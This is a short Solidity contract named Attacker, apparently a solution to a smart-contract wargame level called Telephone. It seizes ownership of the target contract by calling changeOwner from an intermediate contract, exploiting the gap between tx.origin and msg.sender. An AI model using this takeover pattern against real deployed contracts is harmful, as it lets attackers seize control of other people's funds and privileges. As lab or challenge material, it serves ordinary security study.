// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract Attacker {

    Telephone telephone;
    address public owner;

    constructor (address _telephone){
        telephone = Telephone(_telephone);
        owner = msg.sender;
    }

    function claim() public  {

        telephone.changeOwner(owner);
    }
}